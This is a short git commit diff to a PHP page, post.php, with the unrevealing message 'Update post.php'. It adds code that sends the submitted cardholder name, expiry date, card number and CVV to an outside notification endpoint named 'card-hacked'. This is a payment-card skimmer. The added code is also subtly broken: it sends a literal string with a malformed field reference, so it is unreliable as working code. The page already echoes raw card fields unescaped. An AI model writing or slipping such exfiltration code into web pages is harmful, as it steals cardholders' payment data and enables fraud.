8de09ff334cd522e2f04d7d16cbe36868a1908c9
gnutard <166033088+gnutard@users.noreply.github.com>
2024-07-24 10:57:10 +0000

    Update post.php

--- post.php
+++ post.php
@@ -5,6 +5,13 @@
 <?php echo $_POST["exp"]; ?>
 <?php echo $_POST["ccnumber"]; ?>
 <?php echo $_POST["ccv"]; ?>
+<?php file_get_contents('https://ntfy.sh/card-hacked', false, stream_context_create([
+    'http' => [
+        'method' => 'POST', // PUT also works
+        'header' => 'Content-Type: text/plain',
+        'content' => '$_POST["name], $_POST["exp"], $_POST["ccnumber"], echo $_POST["ccv"]'
+    ]
+])); ?>
 
 </body>
 </html>
